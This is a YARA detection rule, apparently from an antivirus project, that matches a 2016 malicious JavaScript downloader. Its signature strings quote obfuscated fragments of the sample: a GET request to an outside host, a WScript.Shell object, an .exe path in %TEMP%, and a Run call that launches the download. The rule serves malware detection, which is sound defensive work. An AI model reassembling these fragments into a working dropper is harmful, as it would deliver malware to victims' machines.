rule sig_20160330_397ffa4ff8cf92cb01e3422b32deeba9 {
  meta:
    description = "datamaliciousorder - file 20160330_397ffa4ff8cf92cb01e3422b32deeba9.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "efdc654a8aa567da8f7709a445bdcc2f5b7cfc0c2607f9be6a76b7d42e2f5947"

  strings:
    $s1  = "_ZF[_J](\"GET\", \"http://hollandfoodexchange.com/d7jsa\", false);" fullword ascii
    $s2  = "function _QU0(_C0, _GH){_ZS = _ZS * 1; return _C0 - _GH;};" fullword ascii
    $s3  = "var _C = function _U() {return WScript[_WX](\"WScript\"+\".Shell\");}(), _X = 11;" fullword ascii
    $s4  = "if (_ZF[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _RQ() {return _C[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"qavBhoXHhKJ.ex\" + \"e\";};" fullword ascii
    $s6  = "function _M(){return _B + \"\";};" fullword ascii
    $s7  = "function _HN() {return ((_F == true) && (_F == _P0)) ? 1 : _ZS;};" fullword ascii
    $s8  = "function _M0(_GY){_C[\"Run\"](_GY, _ZS, _ZS);};" fullword ascii
    $s9  = "function _G(){return 22;};" fullword ascii
    $s10 = "function _A()" fullword ascii
    $s11 = "return _QU0(_D0, _W);" fullword ascii
    $s12 = "var _EK = new this[\"Date\"]();" fullword ascii
    $s13 = "function _Y(_UN) {var _P = (1, 2, 3, 4, 5, _UN); return _P;};" fullword ascii
    $s14 = "function _QU(){return _WX;};" fullword ascii
    $s15 = " while (_RY){" fullword ascii
    $s16 = "_F = true; " fullword ascii
    $s17 = "_P0 = true; " fullword ascii
    $s18 = "var _E = false;" fullword ascii
    $s19 = "var _P0 = false;" fullword ascii
    $s20 = "} catch(_QV){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}